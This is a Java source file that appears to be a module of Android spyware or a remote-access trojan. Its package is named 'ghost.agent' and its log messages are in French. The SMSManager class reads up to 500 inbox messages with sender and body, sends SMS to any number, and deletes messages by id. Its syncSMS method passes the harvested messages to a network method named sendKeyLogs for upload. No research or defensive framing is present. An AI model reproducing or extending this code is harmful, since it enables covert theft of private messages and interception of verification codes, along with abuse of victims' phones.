package com.ghost.agent.core;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class SMSManager {
    
    private static final String TAG = "SMSManager";
    
    private Context context;
    private NetworkManager networkManager;
    
    public SMSManager(Context context, NetworkManager networkManager) {
        this.context = context;
        this.networkManager = networkManager;
    }
    
    public JSONArray getAllSMS() {
        JSONArray messages = new JSONArray();
        
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 500"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject msg = new JSONObject();
                    msg.put("address", cursor.getString(cursor.getColumnIndex("address")));
                    msg.put("body", cursor.getString(cursor.getColumnIndex("body")));
                    msg.put("date", cursor.getLong(cursor.getColumnIndex("date")));
                    msg.put("type", cursor.getInt(cursor.getColumnIndex("type")));
                    messages.put(msg);
                }
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erreur: " + e.getMessage());
        }
        
        return messages;
    }
    
    public void sendSMS(String number, String message) {
        try {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, message, null, null);
            Log.i(TAG, "SMS envoyé à " + number);
        } catch (Exception e) {
            Log.e(TAG, "Erreur envoi SMS: " + e.getMessage());
        }
    }
    
    public void deleteSMS(String id) {
        try {
            context.getContentResolver().delete(
                Uri.parse("content://sms/" + id),
                null, null
            );
        } catch (Exception e) {
            Log.e(TAG, "Erreur suppression: " + e.getMessage());
        }
    }
    
    public void syncSMS() {
        JSONArray sms = getAllSMS();
        if (sms.length() > 0) {
            networkManager.sendKeyLogs(sms.toString());
        }
    }
}
